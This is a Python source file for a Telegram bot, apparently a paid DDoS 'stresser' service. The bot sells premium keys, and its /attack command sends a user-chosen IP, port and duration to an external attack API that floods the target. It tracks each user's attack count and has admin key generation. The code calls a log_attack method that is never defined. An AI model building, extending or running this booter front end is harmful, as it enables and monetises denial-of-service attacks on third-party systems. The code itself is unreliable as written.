import asyncio
import logging
import secrets
import os
import uuid
import requests
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
from functools import wraps

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes
from pymongo import MongoClient, ASCENDING, DESCENDING
from dotenv import load_dotenv

# --- CONFIGURATION & LOGGING ---
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGODB_URI = os.getenv("MONGODB_URI")
DATABASE_NAME = os.getenv("DATABASE_NAME", "sasta_bot")
API_URL = os.getenv("API_URL")
API_KEY = os.getenv("API_KEY")
ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "").split(",") if id.strip().isdigit()]

BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}

# --- HELPERS ---
def make_aware(dt):
    if dt is None: return None
    return dt.replace(tzinfo=timezone.utc) if dt.tzinfo is None else dt

def get_current_time():
    return datetime.now(timezone.utc)

# --- DATABASE CLASS ---
class Database:
    def __init__(self):
        self.client = MongoClient(MONGODB_URI)
        self.db = self.client[DATABASE_NAME]
        self.users = self.db.users
        self.attacks = self.db.attacks
        self.keys = self.db.keys
        self._setup_db()

    def _setup_db(self):
        try:
            self.users.create_index([("user_id", ASCENDING)], unique=True)
            self.keys.create_index([("key", ASCENDING)], unique=True)
            logger.info("✅ Database Optimized & Ready.")
        except Exception as e:
            logger.error(f"❌ DB Setup Error: {e}")

    def get_user(self, user_id: int):
        user = self.users.find_one({"user_id": user_id})
        if user:
            for key in ["created_at", "approved_at", "expires_at"]:
                if user.get(key): user[key] = make_aware(user[key])
        return user

    def create_user(self, user_id: int, username: str = None):
        if self.get_user(user_id): return
        self.users.insert_one({
            "user_id": user_id, "username": username, "approved": False,
            "total_attacks": 0, "created_at": get_current_time(), "is_banned": False
        })

    def generate_key(self, duration_days: int):
        key = f"SASTA-{secrets.token_hex(4).upper()}"
        self.keys.insert_one({
            "key": key, "duration": duration_days, "used": False, "created_at": get_current_time()
        })
        return key

    def redeem_key(self, user_id: int, key_str: str):
        key_doc = self.keys.find_one({"key": key_str, "used": False})
        if not key_doc: return False, "Invalid or Expired Key."
        
        duration = key_doc["duration"]
        expires_at = get_current_time() + timedelta(days=duration)
        self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": True, "approved_at": get_current_time(), "expires_at": expires_at}}
        )
        self.keys.update_one({"key": key_str}, {"$set": {"used": True, "used_by": user_id}})
        return True, f"Premium Activated for {duration} Days!"

db = Database()

# --- DECORATORS ---
def admin_required(func):
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id not in ADMIN_IDS:
            return
        return await func(update, context)
    return wrapper

# --- HANDLERS (VISUALLY ENHANCED) ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    db.create_user(update.effective_user.id, update.effective_user.username)
    welcome_msg = (
        "🔥 **WELCOME TO SASTA DEVELOPER STRESSER** 🔥\n\n"
        "✨ **Status:** Premium Bot\n"
        "⚡ **Speed:** Ultra Fast\n"
        "🛡️ **Safety:** 100% Encrypted\n\n"
        "━━━━━━━━━━━━━━━━━━\n"
        "🛠️ **Commands:**\n"
        "🚀 `/attack <ip> <port> <time>`\n"
        "🔑 `/redeem <key>`\n"
        "👤 `/myinfo` - Check Plan Expiry\n"
        "━━━━━━━━━━━━━━━━━━\n"
        "💎 *DM Admin for Keys!*"
    )
    await update.message.reply_text(welcome_msg, parse_mode='Markdown')

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ **Usage:** `/redeem SASTA-XXXX`", parse_mode='Markdown')
        return
    success, msg = db.redeem_key(update.effective_user.id, context.args[0].upper())
    icon = "✅" if success else "❌"
    await update.message.reply_text(f"{icon} **{msg}**", parse_mode='Markdown')

@admin_required
async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    days = int(context.args[0]) if context.args else 30
    key = db.generate_key(days)
    await update.message.reply_text(
        f"💎 **NEW PREMIUM KEY CREATED** 💎\n\n"
        f"🔑 Key: `{key}`\n"
        f"⏳ Duration: `{days} Days`\n\n"
        f"Share this key with the customer.", 
        parse_mode='Markdown'
    )

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = db.get_user(update.effective_user.id)
    if not user or not user.get("approved") or user.get("expires_at") < get_current_time():
        await update.message.reply_text("⛔ **Access Denied!**\nYou don't have an active premium plan.", parse_mode='Markdown')
        return

    if len(context.args) != 3:
        await update.message.reply_text("📝 **Format:** `/attack <ip> <port> <time>`", parse_mode='Markdown')
        return

    ip, port, duration = context.args[0], int(context.args[1]), int(context.args[2])
    if port in BLOCKED_PORTS:
        await update.message.reply_text("🚫 **Port Blocked!** Security restriction active.", parse_mode='Markdown')
        return

    status_msg = await update.message.reply_text("🛰️ **Connecting to Server...**")
    
    try:
        res = requests.post(f"{API_URL}/api/v1/attack", 
                           json={"ip": ip, "port": port, "duration": duration},
                           headers={"x-api-key": API_KEY}, timeout=15).json()
        
        if res.get("success"):
            db.log_attack(user["user_id"], ip, port, duration, "success")
            await status_msg.edit_text(
                f"🚀 **ATTACK LAUNCHED SUCCESSFULLY!**\n\n"
                f"🎯 **Target:** `{ip}:{port}`\n"
                f"⏳ **Duration:** `{duration}s`\n"
                f"💣 **Status:** Sending Packets...",
                parse_mode='Markdown'
            )
        else:
            await status_msg.edit_text(f"❌ **API Error:** {res.get('error', 'Rejected')}")
    except Exception as e:
        await status_msg.edit_text(f"⚠️ **Server Busy or Offline!**")

async def myinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = db.get_user(update.effective_user.id)
    if not user: return
    
    exp = user.get("expires_at")
    is_active = user.get("approved") and (not exp or exp > get_current_time())
    status_icon = "🟢" if is_active else "🔴"
    exp_str = exp.strftime('%Y-%m-%d %H:%M') if exp else "LIFETIME"
    
    await update.message.reply_text(
        f"👤 **USER PROFILE**\n"
        f"━━━━━━━━━━━━━━━\n"
        f"🆔 ID: `{user['user_id']}`\n"
        f"⭐ Status: {status_icon} {'PREMIUM' if is_active else 'FREE/EXPIRED'}\n"
        f"📅 Expiry: `{exp_str}`\n"
        f"📊 Total Attacks: `{user.get('total_attacks', 0)}`\n"
        f"━━━━━━━━━━━━━━━",
        parse_mode='Markdown'
    )

# --- STARTUP SEQUENCE ---
def main():
    if not BOT_TOKEN:
        logger.error("❌ BOT_TOKEN is missing!")
        return

    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("myinfo", myinfo))

    try:
        server_ip = requests.get('https://api.ipify.org', timeout=3).text
    except:
        server_ip = "N/A"

    print("\n" + "★"*20)
    logger.info("💎 SASTA DEVELOPER PREMIUM BOT INITIALIZED")
    logger.info(f"📍 SERVER IP: {server_ip}")
    logger.info(f"📊 DATABASE: {DATABASE_NAME} - ONLINE")
    logger.info(f"👑 ADMINS LOADED: {len(ADMIN_IDS)}")
    logger.info(f"🚫 BLACKLISTED PORTS: {len(BLOCKED_PORTS)}")
    logger.info("✅ SYSTEM STATUS: OPERATIONAL")
    print("★"*20 + "\n")

    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
